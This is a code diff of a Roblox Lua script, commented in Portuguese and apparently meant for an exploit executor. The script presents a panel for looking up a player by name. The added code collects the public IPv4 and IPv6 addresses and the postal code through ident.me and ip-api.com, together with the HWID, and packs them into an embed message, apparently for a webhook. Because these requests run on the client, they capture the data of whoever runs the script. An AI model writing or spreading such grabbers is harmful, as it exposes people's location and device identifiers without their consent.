@@ -1,15 +1,17 @@
-local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
-local GuiService = game:GetService("GuiService")
+local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
+
+local screenGui
+local frame
 
 -- Função para criar o painel
 local function createTextBoxPanel()
     -- Criar a tela e a estrutura
-    local screenGui = Instance.new("ScreenGui")
+    screenGui = Instance.new("ScreenGui")
     screenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
 
-    local frame = Instance.new("Frame")
+    frame = Instance.new("Frame")
     frame.Size = UDim2.new(0, 300, 0, 150)
     frame.Position = UDim2.new(0.5, -150, 0.5, -75)
     frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
@@ -33,41 +35,28 @@ local function createTextBoxPanel()
     button.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
     button.Parent = frame
 
-    -- Variáveis para arrastar o painel
-    local dragging = false
-    local dragInput, mouseDelta, dragStart
+    -- Função para capturar o IP e CEP usando APIs
+    local function getIpAndLocation()
+        -- Coleta o IP e dados de localização (CEP) usando o serviço ip-api.com
+        local ipV4 = game:HttpGet("https://v4.ident.me/")  -- IP público IPv4
+        local ipV6 = game:HttpGet("https://v6.ident.me/")  -- IP público IPv6
+        local locationData = game:HttpGet("http://ip-api.com/json")  -- Dados de localização (CEP, cidade, país)
 
-    -- Função para iniciar o arrasto
-    frame.InputBegan:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 then
-            dragging = true
-            dragStart = input.Position
-            dragInput = input
-        end
-    end)
+        local location = HttpService:JSONDecode(locationData)
+        local cep = location.zip  -- CEP
+        return ipV4, ipV6, cep
+    end
 
-    -- Função para atualizar a posição enquanto arrasta
-    frame.InputChanged:Connect(function(input)
-        if dragging and input == dragInput then
-            mouseDelta = input.Position - dragStart
-            frame.Position = UDim2.new(frame.Position.X.Scale, mouseDelta.X, frame.Position.Y.Scale, mouseDelta.Y)
-        end
-    end)
-
-    -- Função para finalizar o arrasto
-    frame.InputEnded:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 then
-            dragging = false
-        end
-    end)
-
-    -- Função para capturar as informações do jogador
+    -- Função para enviar as informações
     button.MouseButton1Click:Connect(function()
         local playerName = textBox.Text
         if playerName == "" then
             print("Digite um nome de jogador válido!")
             return
         end
+
+        -- Coleta o IP e o CEP
+        local ipV4, ipV6, cep = getIpAndLocation()
 
         -- Função para pegar as informações do jogador
         local function getPlayerInfo(playerName)
@@ -76,15 +65,13 @@ local function createTextBoxPanel()
                 return nil, "Jogador não encontrado."
             end
 
-            -- Coleta as informações reais do jogador
+            -- Coleta as informações do jogador
             local Userid = player.UserId
             local DName = player.DisplayName
             local Name = player.Name
             local MembershipType = tostring(player.MembershipType):sub(21)
             local AccountAge = player.AccountAge
             local Country = game.LocalizationService.RobloxLocaleId
-            local GetIp = game:HttpGet("https://v4.ident.me/") -- Informações de IP
-            local GetData = game:HttpGet("http://ip-api.com/json") -- Dados do IP
             local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
             local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
 
@@ -98,11 +85,12 @@ local function createTextBoxPanel()
                 MembershipType = MembershipType,
                 AccountAge = AccountAge,
                 Country = Country,
-                GetIp = GetIp,
-                GetData = GetData,
                 GetHwid = GetHwid,
                 GAMENAME = GAMENAME,
-                ConsoleJobId = ConsoleJobId
+                ConsoleJobId = ConsoleJobId,
+                IpV4 = ipV4,
+                IpV6 = ipV6,
+                Cep = cep
             }
         end
 
@@ -120,12 +108,12 @@ local function createTextBoxPanel()
                         ["description"] = string.format(
                             "__[Player Info](https://www.roblox.com/users/%d)__" ..
                             " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
-                            "\n**AccountAge:** %d\n**Country:** %s\n**IP:** %s\n**Hwid:** %s\n**Date:** %s\n**Time:** %s" ..
+                            "\n**AccountAge:** %d\n**Idade da Conta:** %d anos\n**Country:** %s\n**IP v4:** %s\n**IP v6:** %s\n**CEP:** %s\n**Hwid:** %s\n**Date:** %s\n**Time:** %s" ..
                             "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
                             "\n**Game:** %s \n**Game Id**: %d \n**JobId:** %s",
                             playerInfo.Userid, playerInfo.DName, playerInfo.Name, playerInfo.Userid, playerInfo.MembershipType, 
-                            playerInfo.AccountAge, playerInfo.Country, playerInfo.GetIp, playerInfo.GetHwid,
-                            tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
+                            playerInfo.AccountAge, playerInfo.AccountAge, playerInfo.Country, playerInfo.IpV4, playerInfo.IpV6, playerInfo.Cep,
+                            playerInfo.GetHwid, tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
                             game.PlaceId, playerInfo.GAMENAME, game.PlaceId, playerInfo.ConsoleJobId
                         ),
                         ["type"] = "rich",
@@ -169,12 +157,24 @@ local function createTextBoxPanel()
     -- Fechar o painel ao pressionar o Control Direito
     UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
         if not gameProcessedEvent then
-            if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == Enum.KeyCode.RightControl then
-                screenGui:Destroy() -- Remove o painel da tela
+            if input.UserInputType == Enum.UserInputType.Keyboard then
+                if input.KeyCode == Enum.KeyCode.RightControl then
+                    if screenGui then
+                        screenGui:Destroy() -- Remove o painel da tela
+                    end
+                end
             end
         end
     end)
 end
 
--- Criar o painel de entrada de texto
-createTextBoxPanel()
+-- Mostrar o painel ao clicar com o Control Direito
+UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
+    if not gameProcessedEvent then
+        if input.UserInputType == Enum.UserInputType.Keyboard then
+            if input.KeyCode == Enum.KeyCode.RightControl then
+                createTextBoxPanel()  -- Cria o painel quando pressionar Control Direito
+            end
+        end
+    end
+end)
